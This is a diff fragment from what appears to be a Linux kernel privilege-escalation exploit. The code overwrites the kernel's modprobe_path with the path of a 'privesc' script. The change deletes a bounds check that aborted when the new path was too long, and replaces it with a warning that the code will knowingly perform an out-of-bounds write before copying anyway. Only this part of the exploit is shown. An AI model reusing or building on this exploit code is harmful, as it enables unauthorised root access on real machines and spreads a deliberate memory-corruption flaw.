@@ -501,10 +501,8 @@ int main(void)
 		old_len = strlen(modprobe_path_uaddr);
 		new_len = strlen(privesc_script_path);
 		printf("[!] modprobe_path len %zu, privesc_script_path len %zu\n", old_len, new_len);
-		if (new_len > old_len) {
-			printf("[-] not enough bytes in modprobe_path\n");
-			break;
-		}
+		if (new_len > old_len)
+			printf("[!] WARNING: not enough bytes in modprobe_path, gonna do OOB write\n");
 
 		memcpy(modprobe_path_uaddr, privesc_script_path, new_len + 1); /* with null byte */
 		printf("[+] modprobe_path is changed to %s\n", privesc_script_path);
